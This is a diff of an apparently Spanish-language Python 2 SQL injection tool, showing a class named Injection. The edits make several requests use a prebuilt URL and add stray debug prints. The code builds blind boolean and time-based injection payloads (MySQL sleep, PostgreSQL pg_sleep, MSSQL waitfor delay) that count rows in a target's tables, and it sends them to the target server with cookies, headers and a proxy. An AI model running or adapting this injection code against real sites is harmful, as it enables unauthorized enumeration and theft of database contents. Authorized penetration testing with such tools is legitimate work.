@@ -938,8 +938,8 @@ class Injection:
 					direccion = obj.server+obj.pref+"  and (select count(*) from "+table+")="+str(limite)+obj.suf
 				elif "_sqli_" in obj.server:
 					direccion = obj.server.replace("_sqli_",obj.pref+"  and (select count(*) from "+table+")="+str(limite)+obj.suf)
-
-				count = requests.get(url=obj.server.replace("_sqli_",obj.pref+"  and (select count(*) from "+table+")="+str(limite)+obj.suf),cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+				print direccion
+				count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 				if obj.verbosity:
 					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(direccion)))
 				limite = limite +1
@@ -950,7 +950,7 @@ class Injection:
 					direccion = obj.server+obj.pref+"  and (select count(*) from "+where+".."+table+")="+str(limite)+obj.suf
 				elif "_sqli_" in obj.server:
 					direccion = obj.server.replace("_sqli_",obj.pref+"  and (select count(*) from "+where+".."+table+")="+str(limite)+obj.suf)
-				count = requests.get(url=obj.server.replace("_sqli_",obj.pref+"  and (select count(*) from "+where+".."+table+")="+str(limite)+obj.suf),cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+				count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 				if obj.verbosity:
 					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(direccion)))
 				limite = limite +1
@@ -961,7 +961,7 @@ class Injection:
 					direccion = obj.server+obj.pref+"  and if((select count(*) from "+where+"."+table+")="+str(limite)+",sleep(1),0)=0"+obj.suf
 				elif "_sqli_" in obj.server:
 					direccion = obj.server.replace("_sqli_",obj.pref+"  and if((select count(*) from "+where+"."+table+")="+str(limite)+",sleep(1),0)=0"+obj.suf)
-				count = requests.get(url=obj.server.replace("_sqli_",obj.pref+"  and if((select count(*) from "+where+"."+table+")="+str(limite)+",sleep(1),0)=0"+obj.suf),cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+				count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 				print "lol"
 				if obj.verbosity:
 					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(direccion)))
@@ -974,7 +974,7 @@ class Injection:
 					direccion = obj.server+obj.pref+"  select case when ((select count(*) from "+table+")="+str(limite)+") then pg_sleep(1) end"+obj.suf
 				elif "_sqli_" in obj.server:
 					direccion = obj.server.replace("_sqli_",obj.pref+"  select case when ((select count(*) from "+table+")="+str(limite)+") then pg_sleep(1) end"+obj.suf)
-				count = requests.get(url=obj.server.replace("_sqli_",obj.pref+"  select case when ((select count(*) from "+table+")="+str(limite)+") then pg_sleep(1) end"+obj.suf),cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+				count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 				if obj.verbosity:
 					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(direccion)))
 				limite = limite +1
@@ -985,7 +985,7 @@ class Injection:
 					direccion = obj.server+obj.pref+"  if (select count(*) from "+where+".."+table+")="+str(limite)+" waitfor delay '00:00:01'"+obj.suf
 				elif "_sqli_" in obj.server:
 					direccion = obj.server.replace("_sqli_",obj.pref+"  if (select count(*) from "+where+".."+table+")="+str(limite)+" waitfor delay '00:00:01'"+obj.suf)
-				count = requests.get(url=obj.server.replace("_sqli_",obj.pref+"  if (select count(*) from "+where+".."+table+")="+str(limite)+" waitfor delay '00:00:01'"+obj.suf),cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+				count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 				if obj.verbosity:
 					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(obj.server.replace("_sqli_",obj.pref+"  if (select count(*) from "+where+".."+table+")="+str(limite)+" waitfor delay '00:00:01'"+obj.suf))))
 				limite = limite +1
